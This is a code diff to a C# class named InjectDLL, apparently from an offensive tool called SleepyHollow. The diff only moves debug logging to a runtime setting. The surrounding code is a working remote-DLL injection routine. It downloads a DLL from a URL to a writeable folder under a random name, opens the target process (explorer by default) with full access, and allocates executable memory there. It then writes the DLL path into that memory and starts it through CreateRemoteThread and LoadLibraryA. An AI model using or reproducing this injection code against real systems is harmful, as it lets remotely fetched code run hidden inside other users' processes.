@@ -5,11 +5,11 @@ namespace SleepyHollow;
 
 internal static class InjectDLL
 {
-    internal static async Task Run(string dllName, string processName = "explorer", bool debug = false)
+    internal static async Task Run(string dllName, string processName = "explorer")
     {
         if (Uri.TryCreate(dllName, UriKind.Absolute, out Uri uri))
         {
-            if(debug) Console.WriteLine("Downloading...");
+            if(RuntimeConfig.IsDebugEnabled) Console.WriteLine("Downloading...");
             var httpClient = new HttpClient();
             var data = await httpClient.GetByteArrayAsync(uri);
             var tempDirectory = FileSystem.FindWriteableDirectory();
@@ -19,7 +19,7 @@ internal static class InjectDLL
                 return;
             }
             dllName = Path.Combine(FileSystem.FindWriteableDirectory(), $"{Path.GetRandomFileName()}.dll");
-            if(debug) Console.WriteLine($"Writing to {dllName}");
+            if(RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Writing to {dllName}");
             await FileSystem.WriteFile(dllName, data);
         }
 
@@ -30,24 +30,24 @@ internal static class InjectDLL
         }
 
         var pid = process[0].Id;
-        if (debug) Console.WriteLine($"Process ID: {pid}");
+        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Process ID: {pid}");
 
         IntPtr hProcess = Lib.OpenProcess(OpenProcessFlags.PROCESS_ALL_ACCESS, false, pid);
-        if (debug) Console.WriteLine($"Process handle: 0x{hProcess:X}");
+        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Process handle: 0x{hProcess:X}");
 
         IntPtr lpAddress = Lib.VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, Lib.MEM_COMMIT_AND_RESERVE, Lib.PAGE_EXECUTE_READWRITE);
-        if (debug) Console.WriteLine($"Allocated address: 0x{lpAddress:X}");
+        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Allocated address: 0x{lpAddress:X}");
         var res = Lib.WriteProcessMemory(hProcess, lpAddress, Encoding.Default.GetBytes(dllName), dllName.Length, out nint outSize);
-        if (debug) Console.WriteLine($"WriteProcessMemory result: {res} - Bytes written: {outSize}");
+        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"WriteProcessMemory result: {res} - Bytes written: {outSize}");
         IntPtr loadLib = Lib.GetProcAddress(Lib.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
         if (loadLib == IntPtr.Zero)
         {
             Console.WriteLine("Failed to get LoadLibraryA address");
         }
 
-        if (debug) Console.WriteLine($"LoadLibraryA address: 0x{loadLib:X}");
+        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"LoadLibraryA address: 0x{loadLib:X}");
         IntPtr hThread = Lib.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, lpAddress, 0, IntPtr.Zero);
-        if (debug) Console.WriteLine($"Thread creation successful - Thread handle: 0x{hThread:x8}");
+        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Thread creation successful - Thread handle: 0x{hThread:x8}");
         
     }
 }
